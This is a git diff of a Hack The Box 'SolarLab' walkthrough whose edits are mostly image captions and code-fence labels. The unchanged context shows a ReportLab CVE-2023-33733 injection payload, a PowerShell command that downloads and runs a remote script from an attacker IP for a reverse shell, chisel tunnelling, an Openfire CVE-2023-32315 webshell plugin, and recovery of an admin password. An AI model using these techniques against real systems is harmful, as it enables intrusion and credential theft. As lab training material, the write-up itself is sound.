@@ -16,9 +16,9 @@ tags:
 
 description: "SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials. Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell."
 ---
-![alt text](../images/solarlab/blacksolar.png)
+![SolarLab HTB machine banner ](../images/solarlab/blacksolar.png)
 
-# Introduction
+# _Overview
 SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.
 
  Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell.
@@ -69,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 87.15 seconds
 ```
 Fingerprinting OS using smbmap would indicate the machine is a windows server 2019.
 
-```bash
+```shell
 smbmap -H solarlab.htb -v
 ```
 
@@ -84,10 +84,11 @@ smb -H 10.10.11.16 -s Documents -u guest -r
 -----------------------------------------------------------------------------------
 ```
 download the  file
-```
+
+```shell
 smbmap  -H 10.10.11.16 -s Documents -u guest -p "" -r -A  details-file.xlsx  
 ```
-![alt text](../images/solarlab/image-1.png)
+![Excel spreadsheet containing usernames and passwords from SMB share](../images/solarlab/image-1.png)
  it was clear that these were some login credentials related to a domain
 
 Nothing else was discovered on SMB. its time to enumerate port 80.
@@ -95,11 +96,11 @@ Nothing else was discovered on SMB. its time to enumerate port 80.
 ## Enumerating  Port 80
 The default root appeared to be a static site with nothing interesting, so I started looking at other open ports and discovered a subdomain running on port 6791: 
 `http://report.solarlab.htb:6971`
-![alt text](../images/solarlab/report-lab.png)
+![ReportLab web application login page on port 6791](../images/solarlab/report-lab.png)
 I initially started by identifying which users from the spreadsheet existed. Testing h usernames like "blake.byte" or "blake byte" produced a different error messages from "claudiaS" or "alexanderK", confirming that Alex and Claudia exist but the passwords were incorrect.
 ### bruteforcing with intruder
 I attempted bruteforcing in Clusterbomb attack mode, trying different combinations from the spreadsheet file. 
-![alt text](../images/solarlab/intruder.png)
+![Burp Suite Intruder clusterbomb attack configuration for credential bruteforce](../images/solarlab/intruder.png)
 No valid credentials, I returned to the document and observed a pattern in the naming convention. Two users had shortened names, e.g., ClaudiaS and AlexanderK. The third user, Blake Byte, could follow the same pattern.
 Trying the same brute attack with "blakeB" as the login username worked:
 ```
@@ -110,10 +111,11 @@ Trying the same brute attack with "blakeB" as the login username worked:
 This site offers some functionality, and the "Training Request" section leads to a form. 
 ![asas](../images/solarlab/reporthub.webp)
 
-![alt text](../images/solarlab/form.png)
+![Training request form with PDF generation functionality](../images/solarlab/form.png)
 After clicking the "Generate PDF" button, I was redirected to a PDF document. The image gets reflected in the PDF, indicating a possible XSS vulnerability. 
-![alt text](../images/solarlab/signature.png)
+![Generated PDF showing reflected image signature field](../images/solarlab/signature.png)
 I tried simple payloads to test for injection, uploading script files with .html and .svg formats, but no luck. I then downloaded the PDF document and ran exiftool on it:
+
 ```bash
 exiftool output.pdf 
 ExifTool Version Number         : 12.40
@@ -143,7 +145,7 @@ Page Count                      : 1
 The library used to make it is ReportLab.
 
 Searching for “reportlab exploit” turns up information about CVE-2023-33733, a remote code execution vulnerability through Injection in ReportLab:
-![alt text](../images/solarlab/cve.png)
+![CVE-2023-33733 ReportLab RCE vulnerability information](../images/solarlab/cve.png)
 
 ## Exploiting ReportLab
 
@@ -154,7 +156,7 @@ Navigating to the exploit PoC on GitHub, the exploit code was:
  'startswith': lambda self,
   x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
 ```
-![alt text](../images/solarlab/form.png)
+![Training request form showing character limit restriction](../images/solarlab/form.png)
 
 Attempting to send the exploit through the form field
 throws an error in your face indicating that the character limit for the form was exceeded.
@@ -162,7 +164,7 @@ throws an error in your face indicating that the character limit for the form wa
 one way to solve this would be to try and shorten the length of every variable, or to try different parameters
 after intercepting with burp and trying different areas, 
 placing the exploit under `training_request` Drop list option bypasses this restriction.
-![alt text](../images/solarlab/burp.png)
+![Burp Suite showing exploit payload in training_request parameter](../images/solarlab/burp.png)
 
 ## Blake shell
 after confirming the connection it's time to get a shell!
@@ -195,21 +197,22 @@ powershell IEX(IWR http://10.10.16.14/con.ps1 -UseBasicParsing); Invoke-ConPtySh
 
 sending in the repaeter tab, i got a 503 from the web server
  and a powershell session as the blake user.
- ![alt text](../images/solarlab/rev1.png)
+![Successful reverse shell connection as blake user](../images/solarlab/rev1.png)
 ## Initial Foothold
 the user flag was found under `C:\Users\blake\Desktop\flag.txt`
 
 checking `Users` folder, i found `openfire`, `Administrator`, and `blake`(me).
 
 
-getting winpeas
-```
+Uploadingwinpeas
+
+```powershell
 wget "http://10.10.16.97/winPEASany.exe" -OutFile 
 "C:\Users\blake\Desktop\winpeas.exe"
 ```
 Found openfire service Running running a web protal locally on port 9090.
-![alt text](../images/solarlab/listneingport.png)
-```
+![Netstat output showing Openfire service listening on port 9090](../images/solarlab/listneingport.png)
+```powershell
 Openfire(Openfire)["C:\Program Files\Openfire\bin\openfire-service.exe"] - Autoload
 ```
 
@@ -218,17 +221,17 @@ Openfire is a real-time collaboration (RTC) server licensed under the Open Sourc
 I tried to get into `C:\Program Files\Openfire\` to look for scripts/DBs but it was resricted to openfire only.
 ### Openfire Web Server
 port forwarding with chisel so i can interact with local server:
-```
+```powershell
 .\chisel.exe client 10.10.16.14:4321 R:9090:127.0.0.1:9090   #on-victim
 chisel server --socks5 --reverse -p 4321                     #on-attacker
 ```
 
 Navigating to localhost:9090
-![alt text](../images/solarlab/openfire.png)
+![Openfire web administration login page](../images/solarlab/openfire.png)
 ### Exploring CVE-2023-32315
 trying default credentials did not work.
 searching for "openfire exploit" reveals Openfire  is vulnerable to a Path traversal where attackers can abuse the vulneralbility in order to obtain CSRF tokens and cookies for Administrative accounts to generate an account that they can log onto.
-![alt text](../images/solarlab/0_5wf7vTHNYoj8z4hy.webp)
+![CVE-2023-32315 Openfire path traversal vulnerability diagram](../images/solarlab/0_5wf7vTHNYoj8z4hy.webp)
 
 you can Read more about it here:https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236
 ### Shell as Openfire
@@ -242,18 +245,18 @@ This exploit aims to generate a new user with `CVE-2023-32315` and perform RCE t
 6. go to tab server > server settings > Management tool  
 8. Access webshell with password "123"
 
-![alt text](../images/solarlab/cve2.png)
+![CVE-2023-32315 exploit execution creating new admin user](../images/solarlab/cve2.png)
 login with the newly added user:
-![alt text](../images/solarlab/openfirelogin.png)
+![Openfire login with newly created administrative credentials](../images/solarlab/openfirelogin.png)
 follow the other steps to upload the plugin
  go to tab plugin > upload plugin `openfire-management-tool-plugin.jar`
-![alt text](../images/solarlab/plugin.png)
+![Malicious plugin upload interface in Openfire admin panel](../images/solarlab/plugin.png)
 
 go to tab server > server settings > Management tool  
 Access webshell with password "123"
 
 get powershell as openfire with the same technique:
-![alt text](../images/solarlab/powershell-1.png)
+![PowerShell reverse shell as openfire user](../images/solarlab/powershell-1.png)
 
 
 ## SQL Analysis
@@ -271,7 +274,7 @@ NAME VARCHAR(100)
 ,EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
 ```
 Some queries for adding users were also found. The query for creating an admin account was of particular interest to me.
-![alt text](../images/solarlab/OFUSER.png)
+![OFUSER table showing administrator encrypted password](../images/solarlab/OFUSER.png)
 format:
 name,
 `key`,
@@ -281,31 +284,31 @@ serverkey,
  `encrypted password`
  ....The rest. Looks like encryption was used instead of hashing.
  Unlike hashing, Eencryption does not require a function or algorithm, google up ways to decrypt openfire passwords.
-![alt text](../images/solarlab/google-dcrypt.png)
+![Google search results for Openfire password decryption methods](../images/solarlab/google-dcrypt.png)
  checked both github repos to discover key name,
 Column  `passwordkey` in the  `OFPROPERTY` table was found. 
-```
+```powershell
 type .\openfire.script | findstr "OFPROPERTY"
 ```
-![alt text](../images/solarlab/insert.png)
-![alt text](image.png)
+![OFPROPERTY table query showing passwordKey value](../images/solarlab/insert.png)
+![Database query result displaying encryption key](image.png)
 
 
 So now i can leverage my findings to get the administrator's password
+
 ```
-*Encrypted-pass:
-becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac
+*Encrypted-pass: becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac
 62d4e89b2856b0289b365f3069802e59d442
-*Key:
-hGXiFzsKaAeYLjn  
+*Key: hGXiFzsKaAeYLjn  
 ```
+
 I cloned the tool from the  second repo and ran:
 ```java
 java -<encrypted-password> <key>	
 ```
-![alt text](../images/solarlab/java-cve.png)
+![Java decryption tool output revealing administrator plaintext password](../images/solarlab/java-cve.png)
 
-We found it!:
+Found it!:
 ```
 ThisPasswordShouldDo!@ 
 ```
@@ -315,7 +318,7 @@ let's now login to administrator with the PW:
 ```bash
 impacket-smbexec administrator:'<pw>'@<victim-ip
 ```
-![alt text](../images/solarlab/SYSTEMXD.png)
+![SYSTEM shell access via impacket-smbexec as administrator](../images/solarlab/SYSTEMXD.png)
 root flag was found under
  `Administrator\Desktop\root.txt`.
 
